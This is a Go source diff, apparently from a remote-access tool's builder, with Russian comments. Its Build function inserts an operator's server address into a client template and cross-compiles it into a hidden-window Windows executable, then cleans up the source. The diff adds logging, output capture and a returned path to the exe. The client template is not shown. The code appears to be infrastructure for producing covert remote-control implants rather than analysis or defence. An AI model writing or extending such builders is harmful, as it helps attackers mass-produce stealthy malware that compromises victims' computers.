@@ -395,26 +395,45 @@ func copyFile(src, dst string) error {
 	return err
 }`
 
-func Build(serverHost string, buildID string) error {
-	code := strings.ReplaceAll(clientTemplate, "YOUR_SERVER_IP", serverHost)
+func Build(serverHost string, buildID string) (string, error) {
+	startTime := time.Now()
+	log.Printf("[Builder] Starting build %s", buildID)
 
+	// Подготовка директории
 	buildDir := filepath.Join("builds", buildID)
 	if err := os.MkdirAll(buildDir, 0755); err != nil {
-		return fmt.Errorf("failed to create build directory: %v", err)
+		return "", fmt.Errorf("failed to create build directory: %v", err)
 	}
 
+	// Генерация кода
+	code := strings.ReplaceAll(clientTemplate, "YOUR_SERVER_IP", serverHost)
 	clientPath := filepath.Join(buildDir, "client.go")
+	
 	if err := os.WriteFile(clientPath, []byte(code), 0644); err != nil {
-		return fmt.Errorf("failed to write client.go: %v", err)
+		return "", fmt.Errorf("failed to write client.go: %v", err)
 	}
 
+	// Компиляция
 	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
 	cmd.Dir = buildDir
-	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
+	cmd.Env = append(os.Environ(),
+		"CGO_ENABLED=1",
+		"GOOS=windows", 
+		"GOARCH=amd64",
+	)
 
-	if err := cmd.Run(); err != nil {
-		return fmt.Errorf("build failed: %v", err)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("build failed: %v\nOutput: %s", err, string(output))
 	}
 
-	return nil
+	// Очистка
+	if err := os.Remove(clientPath); err != nil {
+		log.Printf("[Builder] Warning: failed to remove temp file: %v", err)
+	}
+
+	exePath := filepath.Join(buildDir, "client.exe")
+	log.Printf("[Builder] Build %s completed in %v", buildID, time.Since(startTime))
+	
+	return exePath, nil
 }
